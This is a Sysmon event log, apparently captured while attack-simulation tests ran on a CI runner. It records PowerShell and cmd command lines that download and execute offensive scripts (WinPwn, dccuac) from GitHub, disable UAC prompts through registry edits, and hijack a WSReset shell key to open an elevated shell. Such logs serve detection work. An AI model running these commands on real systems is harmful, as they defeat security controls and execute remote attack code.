"TimeCreated","Id","Message"
"12/17/2025 8:03:04 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:04.383
ProcessGuid: {f995aebf-63b8-6942-0506-000000000e00}
ProcessId: 4152
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c reg add ""HKLM\SOFTWARE\Microsoft\Security Center"" /v UACDisableNotify /t REG_DWORD /d 1 /f
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:03 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:03.932
ProcessGuid: {f995aebf-63b7-6942-0306-000000000e00}
ProcessId: 9208
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_wiwlh1fm.n04.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:03 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:03.911
ProcessGuid: {f995aebf-63b7-6942-0306-000000000e00}
ProcessId: 9208
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_wiwlh1fm.n04.ps1
CreationUtcTime: 2025-12-17 08:03:03.911
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:03 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:03.824
ProcessGuid: {f995aebf-63b7-6942-0306-000000000e00}
ProcessId: 9208
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:03 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:03:02.350
ProcessGuid: {f995aebf-63b6-6942-fa05-000000000e00}
ProcessId: 1888
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.11
SourceHostname: runnervm8j6r3.nffxvtgvxe4e3eqtaidkon1qmg.bx.internal.cloudapp.net
SourcePort: 54755
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:03:03 AM","22","Dns query:
RuleName: -
UtcTime: 2025-12-17 08:03:02.346
ProcessGuid: {f995aebf-63b6-6942-fa05-000000000e00}
ProcessId: 1888
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:03 AM","22","Dns query:
RuleName: -
UtcTime: 2025-12-17 08:03:01.412
ProcessGuid: {f995aebf-63b5-6942-f805-000000000e00}
ProcessId: 3928
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:03 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:03.311
ProcessGuid: {f995aebf-63b7-6942-fe05-000000000e00}
ProcessId: 1048
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_qr3uzldt.hw2.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:03 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:03.291
ProcessGuid: {f995aebf-63b7-6942-fe05-000000000e00}
ProcessId: 1048
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_qr3uzldt.hw2.ps1
CreationUtcTime: 2025-12-17 08:03:03.291
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:03 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:03.211
ProcessGuid: {f995aebf-63b7-6942-fe05-000000000e00}
ProcessId: 1048
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {New-Item HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command -Force | Out-Null
New-ItemProperty -Path HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command -Name \""""DelegateExecute\"""" -Value \""""\"""" -Force | Out-Null
Set-ItemProperty -Path HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command -Name \""""(default)\"""" -Value \""""C:\Windows\System32\cmd.exe /c start cmd.exe\"""" -Force -ErrorAction SilentlyContinue | Out-Null
$Process = Start-Process -FilePath \""""C:\Windows\System32\WSReset.exe\"""" -WindowStyle Hidden}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:03 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:03:01.417
ProcessGuid: {f995aebf-63b5-6942-f805-000000000e00}
ProcessId: 3928
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.11
SourceHostname: runnervm8j6r3.nffxvtgvxe4e3eqtaidkon1qmg.bx.internal.cloudapp.net
SourcePort: 54754
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:03:02 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:02.777
ProcessGuid: {f995aebf-63b6-6942-fc05-000000000e00}
ProcessId: 9360
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_yfmcjeg0.q3f.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:02 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:02.754
ProcessGuid: {f995aebf-63b6-6942-fc05-000000000e00}
ProcessId: 9360
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_yfmcjeg0.q3f.ps1
CreationUtcTime: 2025-12-17 08:03:02.754
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:02 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:02.674
ProcessGuid: {f995aebf-63b6-6942-fc05-000000000e00}
ProcessId: 9360
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {$orgValue =(Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin).ConsentPromptBehaviorAdmin
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0 -Type Dword -Force}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:02 AM","22","Dns query:
RuleName: -
UtcTime: 2025-12-17 08:03:00.482
ProcessGuid: {f995aebf-63b4-6942-f605-000000000e00}
ProcessId: 1464
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:02 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:02.123
ProcessGuid: {f995aebf-63b6-6942-fa05-000000000e00}
ProcessId: 1888
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_dgvq03ue.avz.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:02 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:02.101
ProcessGuid: {f995aebf-63b6-6942-fa05-000000000e00}
ProcessId: 1888
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_dgvq03ue.avz.ps1
CreationUtcTime: 2025-12-17 08:03:02.101
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:02 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:03:00.487
ProcessGuid: {f995aebf-63b4-6942-f605-000000000e00}
ProcessId: 1464
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.11
SourceHostname: runnervm8j6r3.nffxvtgvxe4e3eqtaidkon1qmg.bx.internal.cloudapp.net
SourcePort: 54753
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:03:02 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:02.023
ProcessGuid: {f995aebf-63b6-6942-fa05-000000000e00}
ProcessId: 1888
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:01 AM","22","Dns query:
RuleName: -
UtcTime: 2025-12-17 08:02:59.425
ProcessGuid: {f995aebf-63b3-6942-f405-000000000e00}
ProcessId: 5540
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:01 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:01.189
ProcessGuid: {f995aebf-63b5-6942-f805-000000000e00}
ProcessId: 3928
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_kjktqr1r.irb.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:01 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:01.167
ProcessGuid: {f995aebf-63b5-6942-f805-000000000e00}
ProcessId: 3928
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_kjktqr1r.irb.ps1
CreationUtcTime: 2025-12-17 08:03:01.167
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:01 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:01.087
ProcessGuid: {f995aebf-63b5-6942-f805-000000000e00}
ProcessId: 3928
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
UACBypass -noninteractive -command \""""C:\windows\system32\cmd.exe\"""" -technique DiskCleanup}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:01 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:02:59.430
ProcessGuid: {f995aebf-63b3-6942-f405-000000000e00}
ProcessId: 5540
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.11
SourceHostname: runnervm8j6r3.nffxvtgvxe4e3eqtaidkon1qmg.bx.internal.cloudapp.net
SourcePort: 54752
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:03:00 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:00.256
ProcessGuid: {f995aebf-63b4-6942-f605-000000000e00}
ProcessId: 1464
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_hlrbmiql.f4e.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:00 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:00.234
ProcessGuid: {f995aebf-63b4-6942-f605-000000000e00}
ProcessId: 1464
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_hlrbmiql.f4e.ps1
CreationUtcTime: 2025-12-17 08:03:00.234
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:00 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:00.155
ProcessGuid: {f995aebf-63b4-6942-f605-000000000e00}
ProcessId: 1464
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
UACBypass -noninteractive -command \""""C:\windows\system32\calc.exe\"""" -technique ccmstp}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:59 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:59.193
ProcessGuid: {f995aebf-63b3-6942-f405-000000000e00}
ProcessId: 5540
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_jr4arrnl.iqm.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:59 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:59.173
ProcessGuid: {f995aebf-63b3-6942-f405-000000000e00}
ProcessId: 5540
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_jr4arrnl.iqm.ps1
CreationUtcTime: 2025-12-17 08:02:59.173
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:59 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:59.090
ProcessGuid: {f995aebf-63b3-6942-f405-000000000e00}
ProcessId: 5540
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
UACBypass -noninteractive -command \""""C:\windows\system32\cmd.exe\"""" -technique magic}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
